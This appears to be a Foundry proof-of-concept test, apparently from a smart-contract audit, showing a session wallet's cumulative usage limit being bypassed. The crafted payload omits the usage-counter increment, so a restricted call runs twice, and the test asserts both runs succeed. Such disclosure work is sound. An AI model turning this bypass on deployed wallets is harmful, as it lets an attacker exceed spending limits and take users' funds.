// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/extensions/sessions/SessionManager.sol";
import "../src/extensions/sessions/explicit/Permission.sol";
import "../src/modules/Payload.sol";
import "../src/Stage1Module.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("Current block.timestamp:", block.timestamp);

        // Set required environment variables for the test base / RPC setup
        console.log("Setting environment variables...");
        vm.setEnv("SEQ_SDK_RPC_MIN_PORT", "8545");
        vm.setEnv("SEQ_SDK_RPC_MAX_PORT", "8545");
        vm.setEnv("SEQ_SDK_RPC_URL_PREFIX", "http://127.0.0.1:");
        console.log("Environment variables set.");

        // ATTACK TIMELINE:
        // 1. [Setup] Create a session topology with a cumulative usage limit (max 1)
        // 2. [T=0] Attacker crafts a payload that calls the target but OMITS the incrementUsageLimit call
        // 3. [T=1] Attacker executes the payload. Validation passes in view context, execution succeeds, but counter is NOT incremented
        // 4. [T=2] Attacker replays the exact same payload. Because the counter was never incremented, validation passes again
        // 5. [Assert] Verify the attacker successfully executed the restricted action multiple times, bypassing the cumulative limit

        // 1. Setup topology with cumulative limit
        console.log("Setting up session permissions...");
        SessionPermissions memory sessionPerms = SessionPermissions({
            signer: sessionWallet.addr,
            chainId: 0,
            valueLimit: 0,
            deadline: uint64(block.timestamp + 1 days),
            permissions: new Permission[](1)
        });
        console.log("Session signer:", sessionWallet.addr);
        console.log("Session deadline:", sessionPerms.deadline);

        sessionPerms.permissions[0] = Permission({ 
            target: address(mockTarget), 
            rules: new ParameterRule[](1) 
        });
        console.log("Permission target:", address(mockTarget));

        // Cumulative rule: max usage is 1
        sessionPerms.permissions[0].rules[0] = ParameterRule({
            cumulative: true,
            operation: ParameterOperation.EQUAL,
            value: bytes32(uint256(1)),
            offset: 0,
            mask: bytes32(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
        });
        console.log("Cumulative rule configured. Max usage: 1");

        console.log("Calling _createTopology...");
        string memory topology = _createTopology(sessionPerms);
        console.log("_createTopology completed.");

        console.log("Calling _createWallet...");
        (Stage1Module Wallet, string memory config,) = _createWallet(topology);
        console.log("_createWallet completed. Wallet address:", address(Wallet));

        // 2. Craft exploit payload (calls mockTarget, but NO incrementUsageLimit call to SessionManager)
        console.log("Building exploit payload...");
        Payload.Decoded memory exploitPayload = _buildPayload(1);
        exploitPayload.calls[0].to = address(mockTarget);
        exploitPayload.calls[0].data = abi.encodePacked(bytes32(uint256(1))); // Satisfies the EQUAL rule
        exploitPayload.calls[0].behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;
        console.log("Exploit payload built. Target:", exploitPayload.calls[0].to);

        uint8[] memory permissionIdxs = new uint8[](1);
        permissionIdxs[0] = 0;

        // 3. First execution - should succeed
        console.log("Generating signature 1...");
        bytes memory signature1 = _validExplicitSignature(exploitPayload, sessionWallet, config, topology, permissionIdxs);
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, exploitPayload);
        console.log("Signature 1 generated and payload packed.");

        console.log("Executing first payload at block.timestamp:", block.timestamp);
        vm.recordLogs();
        Wallet.execute(packedPayload, signature1);
        Vm.Log[] memory logs1 = vm.getRecordedLogs();
        console.log("First execution completed. Logs count:", logs1.length);

        // 4. Second execution - should FAIL if cumulative limit was enforced, but SUCCEEDS due to TOCTOU
        console.log("Generating signature 2...");
        bytes memory signature2 = _validExplicitSignature(exploitPayload, sessionWallet, config, topology, permissionIdxs);
        console.log("Signature 2 generated.");

        console.log("Executing second payload at block.timestamp:", block.timestamp);
        vm.recordLogs();
        Wallet.execute(packedPayload, signature2);
        Vm.Log[] memory logs2 = vm.getRecordedLogs();
        console.log("Second execution completed. Logs count:", logs2.length);

        // 5. Assert both executions succeeded (proving the cumulative limit was bypassed)
        console.log("Asserting logs...");
        assertGt(logs1.length, 0, "First execution should succeed");
        assertGt(logs2.length, 0, "Second execution should succeed due to TOCTOU bypass");
        console.log("=== test_exploit finished successfully ===");
    }
}
